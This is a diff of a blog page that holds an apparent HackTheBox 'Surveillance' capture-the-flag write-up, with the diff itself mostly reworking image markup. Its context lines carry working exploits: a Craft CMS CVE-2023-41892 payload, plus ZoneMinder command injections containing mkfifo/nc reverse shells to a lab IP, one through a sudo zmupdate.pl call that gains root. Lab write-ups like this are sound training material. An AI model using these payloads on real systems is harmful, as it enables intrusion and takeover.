@@ -36,7 +36,7 @@
                             "url": "https:\/\/bchoy.me\/posts\/2023-12-13-hackthebox-surveillance\/featured-image.png",
                             "width":  1400 ,
                             "height":  1166 
-                        }],"genre": "posts","wordcount":  3306 ,
+                        }],"genre": "posts","wordcount":  3333 ,
         "url": "https:\/\/bchoy.me\/posts\/2023-12-13-hackthebox-surveillance\/","datePublished": "2023-12-13T13:45:14+00:00","dateModified": "2023-12-13T13:45:14+00:00","license": "bchoy.me","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -110,7 +110,7 @@
             <div class="toc-content always-active" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox Surveillance</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://bchoy.me" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Brian Choy</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="12-13-2023">12-13-2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3306 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="12-13-2023">12-13-2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3333 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;16 minutes&nbsp;</div>
         </div><div class="featured-image"><img
         class="lazyload"
@@ -189,14 +189,16 @@
 </span></span><span class="line"><span class="cl">curl: <span class="o">(</span>6<span class="o">)</span> Could not resolve host: surveillance.htb
 </span></span></code></pre></div><p>To resolve this site, <code>10.10.11.245 surveillance.htb</code> needs to be added to the <code>/etc/hosts</code> file.</p>
 <p>Now the page is viewable.</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image.png"
-        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image.png, /posts/2023-12-13-hackthebox-surveillance/assets/image.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image.png 2x"
-        data-sizes="auto"
-        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image.png"
-        title="Home Page" width="1791" height="1164" /></p>
+<figure><a class="lightgallery" href="/posts/2023-12-13-hackthebox-surveillance/assets/image.png" title="/posts/2023-12-13-hackthebox-surveillance/assets/image.png" data-thumbnail="/posts/2023-12-13-hackthebox-surveillance/assets/image.png" data-sub-html="<h2>Home Page</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image.png"
+            data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image.png, /posts/2023-12-13-hackthebox-surveillance/assets/image.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image.png 2x"
+            data-sizes="auto"
+            alt="/posts/2023-12-13-hackthebox-surveillance/assets/image.png" width="1791" height="1164" />
+    </a><figcaption class="image-caption">Home Page</figcaption>
+    </figure>
 <h3 id="web-enumeration">Web Enumeration</h3>
 <p>Check to see what technologies the site was built with.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ whatweb -a3 -v surveillance.htb
@@ -317,14 +319,16 @@ directories now.</p>
 </span></span><span class="line"><span class="cl"><span class="m">200</span>      GET        9l       26w      304c http://surveillance.htb/.htaccess
 </span></span><span class="line"><span class="cl"><span class="m">200</span>      GET       27l       63w     1202c http://surveillance.htb/web.config
 </span></span></code></pre></div><p>The scans reveal a login page.</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-1.png"
-        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-1.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-1.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-1.png 2x"
-        data-sizes="auto"
-        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-1.png"
-        title="Craft CMS Login" width="1791" height="1163" /></p>
+<figure><a class="lightgallery" href="/posts/2023-12-13-hackthebox-surveillance/assets/image-1.png" title="/posts/2023-12-13-hackthebox-surveillance/assets/image-1.png" data-thumbnail="/posts/2023-12-13-hackthebox-surveillance/assets/image-1.png" data-sub-html="<h2>Craft CMS Login</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-1.png"
+            data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-1.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-1.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-1.png 2x"
+            data-sizes="auto"
+            alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-1.png" width="1791" height="1163" />
+    </a><figcaption class="image-caption">Craft CMS Login</figcaption>
+    </figure>
 <p>It says right there again, &ldquo;craft cms&rdquo;. To look for potential vulnerabilities I
 check if there are any available using <code>searchsploit</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ searchsploit craft cms
@@ -345,14 +349,16 @@ check if there are any available using <code>searchsploit</code>.</p>
 and nothing in <code>searchsploit</code> looks particularly promising. After some Googling,
 I found a recent vulnerability for Craft CMS
 <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-41892" target="_blank" rel="noopener noreffer ">CVE-2023-41892</a>.</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-17.png"
-        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-17.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-17.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-17.png 2x"
-        data-sizes="auto"
-        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-17.png"
-        title="CVE-2023-41892" width="1546" height="916" /></p>
+<figure><a class="lightgallery" href="/posts/2023-12-13-hackthebox-surveillance/assets/image-17.png" title="/posts/2023-12-13-hackthebox-surveillance/assets/image-17.png" data-thumbnail="/posts/2023-12-13-hackthebox-surveillance/assets/image-17.png" data-sub-html="<h2>CVE-2023-41892</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-17.png"
+            data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-17.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-17.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-17.png 2x"
+            data-sizes="auto"
+            alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-17.png" width="1546" height="916" />
+    </a><figcaption class="image-caption">CVE-2023-41892</figcaption>
+    </figure>
 <p>It is a critical vulnerability rated 9.8 and 10, affecting versions before
 4.4.15. The <a href="https://github.com/craftcms/cms/blob/develop/CHANGELOG.md#4415---2023-07-03-critical" target="_blank" rel="noopener noreffer ">Craft CMS GitHub repo&rsquo;s changelog</a>
 shows this vulnerability was patched 2023-07-03. There&rsquo;s a chance this site is
@@ -365,24 +371,28 @@ vulnerable.</p>
 </ul>
 <p>Test to see if the site is vulnerable to the exploit:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ curl -k <span class="s2">&#34;http://surveillance.htb/index.php&#34;</span> -X POST -d <span class="s1">&#39;action=conditions/render&amp;test[userCondition]=craft\elements\conditions\users\UserCondition&amp;config={&#34;name&#34;:&#34;test[userCondition]&#34;,&#34;as xyz&#34;:{&#34;class&#34;:&#34;\\GuzzleHttp\\Psr7\\FnStream&#34;,&#34;__construct()&#34;:[{&#34;close&#34;:null}],&#34;_fn_close&#34;:&#34;phpinfo&#34;}}&#39;</span> &gt; output.html
-</span></span></code></pre></div><p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-2.png"
-        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-2.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-2.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-2.png 2x"
-        data-sizes="auto"
-        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-2.png"
-        title="phpinfo" width="1790" height="1165" /></p>
+</span></span></code></pre></div><figure><a class="lightgallery" href="/posts/2023-12-13-hackthebox-surveillance/assets/image-2.png" title="/posts/2023-12-13-hackthebox-surveillance/assets/image-2.png" data-thumbnail="/posts/2023-12-13-hackthebox-surveillance/assets/image-2.png" data-sub-html="<h2>phpinfo</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-2.png"
+            data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-2.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-2.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-2.png 2x"
+            data-sizes="auto"
+            alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-2.png" width="1790" height="1165" />
+    </a><figcaption class="image-caption">phpinfo</figcaption>
+    </figure>
 <p>This looks very promising. We also gain some valuable information by going
 through the output such as:</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-3.png"
-        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-3.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-3.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-3.png 2x"
-        data-sizes="auto"
-        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-3.png"
-        title="Alt text" width="1792" height="1160" /></p>
+<figure><a class="lightgallery" href="/posts/2023-12-13-hackthebox-surveillance/assets/image-3.png" title="/posts/2023-12-13-hackthebox-surveillance/assets/image-3.png" data-thumbnail="/posts/2023-12-13-hackthebox-surveillance/assets/image-3.png" data-sub-html="<h2>phpinfo</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-3.png"
+            data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-3.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-3.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-3.png 2x"
+            data-sizes="auto"
+            alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-3.png" width="1792" height="1160" />
+    </a><figcaption class="image-caption">phpinfo</figcaption>
+    </figure>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;CRAFT_APP_ID&#39;</span><span class="o">]</span> CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7
 </span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;CRAFT_ENVIRONMENT&#39;</span><span class="o">]</span> production
 </span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;CRAFT_SECURITY_KEY&#39;</span><span class="o">]</span> 2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_
@@ -427,14 +437,16 @@ to the proxies and changed the exploit to target a writable file instead of
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span></code></pre></div><p>Either the script is inconsistent, or my modifications aren&rsquo;t optimal. After a
 couple of attempts I managed to get a shell.</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-4.png"
-        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-4.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-4.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-4.png 2x"
-        data-sizes="auto"
-        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-4.png"
-        title="Shell Access" width="528" height="786" /></p>
+<figure><a class="lightgallery" href="/posts/2023-12-13-hackthebox-surveillance/assets/image-4.png" title="/posts/2023-12-13-hackthebox-surveillance/assets/image-4.png" data-thumbnail="/posts/2023-12-13-hackthebox-surveillance/assets/image-4.png" data-sub-html="<h2>Shell Access</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-4.png"
+            data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-4.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-4.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-4.png 2x"
+            data-sizes="auto"
+            alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-4.png" width="528" height="786" />
+    </a><figcaption class="image-caption">Shell Access</figcaption>
+    </figure>
 <h3 id="linux-enumeration">Linux Enumeration</h3>
 <p>I used <code>Girsh</code> to automate the process of upgrading to a better shell and close
 out the connection used with the python script.</p>
@@ -602,14 +614,16 @@ a <code>surveillance--2023-10-17-202801--v4.4.14.sql</code> file.</p>
 Type: sha256
 Result: starcraft122490
 </code></pre><p>The password works with <code>ssh</code> and we get the user flag!</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-5.png"
-        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-5.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-5.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-5.png 2x"
-        data-sizes="auto"
-        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-5.png"
-        title="Alt text" width="754" height="865" /></p>
+<figure><a class="lightgallery" href="/posts/2023-12-13-hackthebox-surveillance/assets/image-5.png" title="/posts/2023-12-13-hackthebox-surveillance/assets/image-5.png" data-thumbnail="/posts/2023-12-13-hackthebox-surveillance/assets/image-5.png" data-sub-html="<h2>User Flag</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-5.png"
+            data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-5.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-5.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-5.png 2x"
+            data-sizes="auto"
+            alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-5.png" width="754" height="865" />
+    </a><figcaption class="image-caption">User Flag</figcaption>
+    </figure>
 <p>Now I can stop <code>hashcat</code> since it&rsquo;s destroying my desktop and start looking for
 privilege escalation. Unfortunately there are no easy <code>sudo</code> binaries to abuse.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">matthew@surveillance:~$ sudo -l
@@ -701,26 +715,30 @@ enumerate.</p>
 </span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN      -
 </span></span></code></pre></div><p>A simple port forward allows me to view the site.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ssh -L 9000:127.0.0.1:8080 matthew@10.10.11.245
-</span></span></code></pre></div><p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-6.png"
-        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-6.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-6.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-6.png 2x"
-        data-sizes="auto"
-        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-6.png"
-        title="ZoneMinder Login" width="1793" height="1161" /></p>
+</span></span></code></pre></div><figure><a class="lightgallery" href="/posts/2023-12-13-hackthebox-surveillance/assets/image-6.png" title="/posts/2023-12-13-hackthebox-surveillance/assets/image-6.png" data-thumbnail="/posts/2023-12-13-hackthebox-surveillance/assets/image-6.png" data-sub-html="<h2>ZoneMinder Login</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-6.png"
+            data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-6.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-6.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-6.png 2x"
+            data-sizes="auto"
+            alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-6.png" width="1793" height="1161" />
+    </a><figcaption class="image-caption">ZoneMinder Login</figcaption>
+    </figure>
 <h3 id="exploiting-zoneminder">Exploiting ZoneMinder</h3>
 <p>After trying a couple user/password combinations, I remember that <code>matthew</code> is
 the admin user to the site. The <code>admin:starcraft122490</code> login works and now
 have access to the admin panel.</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-7.png"
-        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-7.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-7.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-7.png 2x"
-        data-sizes="auto"
-        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-7.png"
-        title="ZoneMinder Admin" width="1793" height="1161" /></p>
+<figure><a class="lightgallery" href="/posts/2023-12-13-hackthebox-surveillance/assets/image-7.png" title="/posts/2023-12-13-hackthebox-surveillance/assets/image-7.png" data-thumbnail="/posts/2023-12-13-hackthebox-surveillance/assets/image-7.png" data-sub-html="<h2>ZoneMinder Admin</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-7.png"
+            data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-7.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-7.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-7.png 2x"
+            data-sizes="auto"
+            alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-7.png" width="1793" height="1161" />
+    </a><figcaption class="image-caption">ZoneMinder Admin</figcaption>
+    </figure>
 <p>Upon login, the version number <code>v1.36.32</code> is shown in the upper right corner.
 This version of ZoneMinder has a couple vulnerabilities.</p>
 <ul>
@@ -733,24 +751,28 @@ manually. Looking at the <a href="https://github.com/rapid7/metasploit-framework
 CSRF token. Instead of replicating the logic to programmatically retrieve it, I
 cheat a little bit since we&rsquo;re logged in by triggering a POST request and
 grabbing the <code>__csrf_magic</code> value.</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-18.png"
-        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-18.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-18.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-18.png 2x"
-        data-sizes="auto"
-        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-18.png"
-        title="Copy POST Request as curl" width="1792" height="1163" /></p>
+<figure><a class="lightgallery" href="/posts/2023-12-13-hackthebox-surveillance/assets/image-18.png" title="/posts/2023-12-13-hackthebox-surveillance/assets/image-18.png" data-thumbnail="/posts/2023-12-13-hackthebox-surveillance/assets/image-18.png" data-sub-html="<h2>Copy POST Request as curl</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-18.png"
+            data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-18.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-18.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-18.png 2x"
+            data-sizes="auto"
+            alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-18.png" width="1792" height="1163" />
+    </a><figcaption class="image-caption">Copy POST Request as curl</figcaption>
+    </figure>
 <p>We send the modified POST request with a URI encoded reverse shell.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl <span class="s1">&#39;http://127.0.0.1:9000/?&#39;</span> --compressed -X POST -H <span class="s1">&#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#39;</span> -H <span class="s1">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#39;</span> -H <span class="s1">&#39;Accept-Language: en-US,en;q=0.5&#39;</span> -H <span class="s1">&#39;Accept-Encoding: gzip, deflate, br&#39;</span> -H <span class="s1">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span class="s1">&#39;Origin: http://127.0.0.1:9000&#39;</span> -H <span class="s1">&#39;Connection: keep-alive&#39;</span> -H <span class="s1">&#39;Referer: http://127.0.0.1:9000/?view=console&#39;</span> -H <span class="s1">&#39;Cookie: zmSkin=classic; zmCSS=base; zmMontageLayout=3; zmMontageScale=; zmControlTable.bs.table.columns=%5B%22Name%22%2C%22Type%22%2C%22Protocol%22%2C%22CanMove%22%2C%22CanZoom%22%2C%22CanFocus%22%2C%22CanIris%22%2C%22CanWhiteBal%22%2C%22HasPresets%22%5D; zmControlTable.bs.table.sortOrder=asc; zmControlTable.bs.table.sortName=CanIris; ZMSESSID=8iechipb0qd842v7s7hpii66ad; zmBandwidth=high; zmControlTable.bs.table.searchText=; zmControlTable.bs.table.pageNumber=1&#39;</span> -H <span class="s1">&#39;Upgrade-Insecure-Requests: 1&#39;</span> -H <span class="s1">&#39;Sec-Fetch-Dest: document&#39;</span> -H <span class="s1">&#39;Sec-Fetch-Mode: navigate&#39;</span> -H <span class="s1">&#39;Sec-Fetch-Site: same-origin&#39;</span> -H <span class="s1">&#39;Sec-Fetch-User: ?1&#39;</span> --data-raw <span class="s1">&#39;__csrf_magic=key%3A224850641cde07fd2c00407c39571fdb77f5393f%2C1702453937&amp;view=snapshot&amp;action=create&amp;monitor_ids[0][Id]=;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.14.5%204443%20%3E%2Ftmp%2Ff&#39;</span>
-</span></span></code></pre></div><p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-8.png"
-        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-8.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-8.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-8.png 2x"
-        data-sizes="auto"
-        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-8.png"
-        title="Girsh Shell" width="752" height="308" /></p>
+</span></span></code></pre></div><figure><a class="lightgallery" href="/posts/2023-12-13-hackthebox-surveillance/assets/image-8.png" title="/posts/2023-12-13-hackthebox-surveillance/assets/image-8.png" data-thumbnail="/posts/2023-12-13-hackthebox-surveillance/assets/image-8.png" data-sub-html="<h2>Girsh Shell</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-8.png"
+            data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-8.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-8.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-8.png 2x"
+            data-sizes="auto"
+            alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-8.png" width="752" height="308" />
+    </a><figcaption class="image-caption">Girsh Shell</figcaption>
+    </figure>
 <h3 id="gaining-root">Gaining Root</h3>
 <p>Starting off with seeing what <code>sudo</code> access is available to this user:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -l
@@ -839,23 +861,27 @@ I force an update to examine the output.</p>
 finagling. I replicated the command and added in a reverse shell, then used
 <code>echo</code> so the rest of the command won&rsquo;t break.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo zmupdate.pl --version<span class="o">=</span><span class="m">2</span> -u <span class="s2">&#34;zmuser -p&#39;ZoneMinderPassword2023&#39; -hlocalhost --add-drop-table --databases zm; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.5 4443 &gt;/tmp/f; echo &#34;</span>
-</span></span></code></pre></div><p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-15.png"
-        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-15.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-15.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-15.png 2x"
-        data-sizes="auto"
-        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-15.png"
-        title="Root Access" width="749" height="1106" /></p>
+</span></span></code></pre></div><figure><a class="lightgallery" href="/posts/2023-12-13-hackthebox-surveillance/assets/image-15.png" title="/posts/2023-12-13-hackthebox-surveillance/assets/image-15.png" data-thumbnail="/posts/2023-12-13-hackthebox-surveillance/assets/image-15.png" data-sub-html="<h2>Root Access</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-15.png"
+            data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-15.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-15.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-15.png 2x"
+            data-sizes="auto"
+            alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-15.png" width="749" height="1106" />
+    </a><figcaption class="image-caption">Root Access</figcaption>
+    </figure>
 <p>The new shell is executed as the <code>root</code> user and the flag can be claimed!</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-16.png"
-        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-16.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-16.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-16.png 2x"
-        data-sizes="auto"
-        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-16.png"
-        title="Root Flag" width="745" height="342" /></p>
+<figure><a class="lightgallery" href="/posts/2023-12-13-hackthebox-surveillance/assets/image-16.png" title="/posts/2023-12-13-hackthebox-surveillance/assets/image-16.png" data-thumbnail="/posts/2023-12-13-hackthebox-surveillance/assets/image-16.png" data-sub-html="<h2>Root Flag</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-16.png"
+            data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-16.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-16.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-16.png 2x"
+            data-sizes="auto"
+            alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-16.png" width="745" height="342" />
+    </a><figcaption class="image-caption">Root Flag</figcaption>
+    </figure>
 </div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
